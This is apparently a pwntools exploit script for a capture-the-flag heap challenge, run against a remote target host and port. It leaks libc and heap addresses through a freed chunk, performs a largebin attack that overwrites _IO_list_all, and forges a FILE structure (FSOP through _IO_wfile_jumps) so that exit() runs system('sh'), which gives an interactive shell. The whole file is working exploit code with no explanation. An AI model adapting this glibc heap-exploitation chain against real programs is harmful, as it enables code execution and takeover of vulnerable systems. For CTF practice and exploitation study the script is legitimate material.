#!/usr/bin/env python3
from pwn import *

PORT = 45528
HOST = "144.79.188.39"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001D91
            brva 0x0000000000001888
            brva 0x0000000000001601
            brva 0x00000000000017D3
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def create(idx, sz, dt):
    sla(b'> ', b'1')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())
    sa(b'Data: ', dt)

def read(idx):
    sla(b'> ', b'2')
    sla(b'Index: ', str(idx).encode())

def edit(idx, dt):
    sla(b'> ', b'3')
    sla(b'Index: ', str(idx).encode())
    sa(b'Data: ', dt)

def delete(idx):
    sla(b'> ', b'4')
    sla(b'Index: ', str(idx).encode())

# Stage 1: Leak heap, libc

create(0, 0x420, b'A'*0x420)                        
create(1, 0x18, b'B'*0x10 + b'  sh\x00\x00\x00\x00') 
create(2, 0x410, b'C' * 0x410)                       
create(3, 0x8,  b'D' * 0x8)
# GDB()

delete(0)
read(0)
p.recvuntil(b'Data: ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ace0
log.success(f'libc_base: {hex(libc.address)}')

create(4, 0x430, b'E'*0x430) # chunk0 -> large bin

read(0)
p.recvuntil(b'Data: ')
leak = p.recvn(0x420)
chunk0 = u64(leak[0x10:0x18]) + 0x10
log.success(f'chunk0: {hex(chunk0)}')

# Stage 2: Largebin attack

FF = chunk0 + 0x430 + 0x10

delete(2)

pl = bytearray(leak)
pl[0x18:0x20] = p64(libc.sym._IO_list_all - 0x20)
GDB()
edit(0, bytes(pl))
create(5, 0x440, b'F'*0x440)

fsop = flat({
    0x20 - 0x10: 0,  # write_base
    0x28 - 0x10: 1,  # write_ptr
    0x68 - 0x10: libc.sym.system,  # wide_vtable[0x68]
    0x88 - 0x10: FF + 0x200,  #_lock
    0xa0 - 0x10: FF,          # _wide_data
    0xd8 - 0x10: libc.sym._IO_wfile_jumps,  # vtable
    0xe0 - 0x10: FF           # wide_vtable
    }, filler = b'\x00', length = 0x410)

# GDB()
edit(2, fsop)

# wait ~60s to call exit() in alarm(60)
p.interactive()